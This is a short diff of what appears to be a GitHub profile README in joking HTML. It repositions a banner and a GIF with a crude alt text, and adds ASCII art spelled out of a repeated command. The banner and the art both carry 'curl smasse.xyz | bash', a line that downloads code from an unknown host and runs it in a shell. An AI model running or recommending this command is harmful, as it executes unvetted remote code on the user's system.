@@ -96,17 +96,17 @@
 <br>
 </br>
 
+<h1>
+<tr> 
+  <td>⭐⭐NORMINO⭐⭐ : curl smasse.xyz | bash
+</tr>
+</h1>
 
+<img align="center" src="https://github.com/Axeltheaxelotl/boite-a-foutre/blob/main/67c9cfd20d306676691206.gif?raw=true" alt="Sam et sa cousine" style="width:1000px; height:300px;">
 
 <h1 align="center">
   <pre>
-    <table align="center" border="0" align="center;">
-      <tr> 
-       <td>⭐⭐NORMINO⭐⭐ : curl smasse.xyz | bash
-      </tr>
     </table>
-      <img align="center" src="https://github.com/Axeltheaxelotl/boite-a-foutre/blob/main/67c9cfd20d306676691206.gif?raw=true" alt="Sam et sa cousine" style="width:700px; height:300px;">
-      <br>
 curl smasse⢀⣤⣤⣤⣤⡀xyz | bash⠀curl s
 masse.xyz ⢠⣿⠋⠀⠀⠙⢿⣦⡀| bash curl sm
 asse.xyz |⣸⡇⠀⠀⠀⠀⠀⠙⢿⣦⡀ba⢀⣀⣀⣠⣤⣀sh
